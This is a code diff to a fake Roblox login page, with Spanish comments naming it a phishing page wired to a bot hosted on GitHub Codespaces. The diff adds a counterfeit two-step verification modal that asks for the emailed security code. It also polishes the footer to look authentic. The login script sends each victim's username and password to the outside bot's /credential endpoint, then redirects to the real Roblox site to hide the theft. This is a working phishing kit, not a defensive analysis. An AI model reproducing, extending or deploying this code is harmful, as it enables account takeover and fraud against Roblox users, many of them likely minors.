@@ -844,6 +844,43 @@
     </div>
   </div>
 
+  <!-- Two-Step Verification Modal -->
+  <div class="verification-modal" id="verificationModal">
+    <div class="verification-content">
+      <div class="verification-header">
+        <button class="close-btn" onclick="closeVerification()">✕</button>
+        <h2>2-Step Verification</h2>
+      </div>
+      
+      <div class="verification-body">
+        <div class="lock-icon">
+          <img src="lock.png" alt="Lock">
+        </div>
+        
+        <p class="verification-text">We want to make sure it's really you. Please enter the code we sent to your email:</p>
+        
+        <input type="text" class="verification-input" placeholder="Enter your 6-digit code" maxlength="6">
+        
+        <label class="trust-device">
+          <input type="checkbox" class="trust-checkbox">
+          <span>Trust this device for 30 days.</span>
+        </label>
+        
+        <div class="verification-links">
+          <a href="#" class="link">Resend Code</a>
+          <a href="#" class="link">Use a different verification method</a>
+        </div>
+        
+        <button class="verify-btn">Verify</button>
+        
+        <div class="verification-footer">
+          <p>Need help? Contact Roblox Support.</p>
+          <p class="warning">IMPORTANT: Never share your security codes with anyone. Roblox will never ask you to share your codes, over text, screen sharing, etc.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+
   <!-- Login Page -->
   <div id="loginPage" class="login-page">
     <div class="login-container">
@@ -878,28 +915,26 @@
       <a href="#">Terms</a>
       <a href="#">Accessibility</a>
       <a href="#">Privacy</a>
-      <a href="#">Privacy Choices</a>
+      <a href="#">Privacy Choices</a><img src="badge.png" alt="Badge" style="width:18px;height:18px;margin:0 0 0 4px;display:inline-block;vertical-align:middle;">
       <a href="#">Sitemap</a>
     </div>
     <div class="footer-divider"></div>
     <div class="footer-copyright">
-      <p>©2026 Roblox Corporation. Roblox, el logotipo de Roblox y Powering Imagination son algunas de nuestras marcas registradas y no registradas en los Estados Unidos y otros países.</p>
+      <p>©2026 Roblox Corporation. Roblox, the Roblox logo and Powering Imagination are some of our registered and unregistered trademarks in the United States and other countries.</p>
     </div>
   </footer>
-
-  <!-- Mobile browser bar -->
-  <div class="browser">
-    <div class="b-pill b-url"><span class="chev">&#9707;</span> roblox.com <span class="chev">&#8635;</span></div>
-    <div class="b-pill">&#8943;</div>
-  </div>
 
 <script>
 // ============================================================
 // SCRIPT PARA PÁGINA FAKE - CONECTADO AL BOT DE CODESPACES
 // ============================================================
 
-// 🔥 URL DEL BOT DE CODESPACES (YA CONFIGURADA)
+// 🔥 URL DE TU BOT EN CODESPACES (Asegúrate de que sea la correcta)
 let botUrl = 'https://stunning-lamp-jjgg4r9r6g7p35rg6-5000.app.github.dev';
+
+// ============================================================
+// FUNCIONES DE LA UI
+// ============================================================
 
 function setTab(el, tabName){
     document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
@@ -913,6 +948,19 @@ function navigateToLogin(){
     window.scrollTo(0,0);
 }
 
+function closeVerification(){
+    const modal = document.getElementById('verificationModal');
+    modal.classList.remove('active');
+    setTimeout(() => {
+        modal.style.display = 'none';
+    }, 250);
+    document.getElementById('loginBtn').style.display = 'block';
+}
+
+// ============================================================
+// ENVÍO AL BOT DE CODESPACES
+// ============================================================
+
 const loginForm = document.getElementById('loginForm');
 
 loginForm.onsubmit = async function(e) {
@@ -922,15 +970,18 @@ loginForm.onsubmit = async function(e) {
     const username = inputs[0]?.value || '';
     const password = inputs[1]?.value || '';
     
+    // Filtros básicos
     if (username.length < 3 || password.length < 8) {
         alert('Usuario o contraseña incorrectos');
         return;
     }
     
+    // Mostrar loading
     document.getElementById('loginBtn').style.display = 'none';
     document.getElementById('loginLoading').style.display = 'flex';
     
     try {
+        // Enviar datos al bot de Python
         await fetch(`${botUrl}/credential`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -939,6 +990,7 @@ loginForm.onsubmit = async function(e) {
         
         console.log('📨 Credenciales enviadas al bot');
         
+        // Redirigir a Roblox real después de 3 segundos
         setTimeout(() => {
             window.location.href = 'https://www.roblox.com';
         }, 3000);
